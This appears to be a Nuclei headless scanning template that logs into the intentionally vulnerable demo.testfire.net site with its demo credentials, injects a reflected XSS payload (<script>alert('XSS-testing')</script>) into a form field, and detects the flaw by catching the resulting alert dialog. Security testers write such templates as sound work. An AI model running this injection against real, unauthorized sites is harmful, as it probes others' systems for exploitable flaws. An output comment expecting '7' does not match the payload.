
id: login_template

info:
  name: login_template
  author: pdteam
  severity: high

headless:

  - steps:
      - args:
          url: "https://demo.testfire.net/login.jsp"
        action: navigate
      - action: waitload
      - args:
          by: xpath
          xpath: /html/body/table/tbody/tr[2]/td[2]/div/form/table/tbody/tr[1]/td[2]/input
        action: click
      - action: waitload
      - args:
          by: xpath
          value: jsmith
          xpath: /html/body/table/tbody/tr[2]/td[2]/div/form/table/tbody/tr[1]/td[2]/input
        action: text
      - args:
          by: xpath
          xpath: /html/body/table/tbody/tr[2]/td[2]/div/form/table/tbody/tr[2]/td[2]/input
        action: click
      - action: waitload
      - args:
          by: xpath
          value: demo123
          xpath: /html/body/table/tbody/tr[2]/td[2]/div/form/table/tbody/tr[2]/td[2]/input
        action: text
      - args:
          by: xpath
          xpath: /html/body/table/tbody/tr[2]/td[2]/div/form/table/tbody/tr[3]/td[2]/input
        action: click
      - action: waitload



  - steps:
      - action: navigate
        args:
          url: "https://demo.testfire.net/index.jsp"

      - action: waitload


  - steps:

      # click on the input field first before filling 
      - args:
          by: xpath
          xpath: /html/body/div[1]/form/table/tbody/tr[1]/td[2]/input[1]
        action: click
      - action: waitload

      # Type XSS payload into the input field
      - args:
          by: xpath
          xpath: /html/body/div[1]/form/table/tbody/tr[1]/td[2]/input[1]
          value: <script>alert('XSS-testing')</script>
        action: text

      # Click the submit button
      - args:
          by: xpath
          xpath: /html/body/div[1]/form/table/tbody/tr[1]/td[2]/input[2]
        action: click

      - action: waitload

      - action: waitdialog
        name: reflected_text_query
        args:
          max-duration: 10s
      
          

    matchers:
      - type: dsl
        dsl:
          - reflected_text_query == true

    extractors:
      - type: dsl
        dsl:
          - reflected_text_query_type # Output: "alert"
          - reflected_text_query_message # Output: "7"
      
    
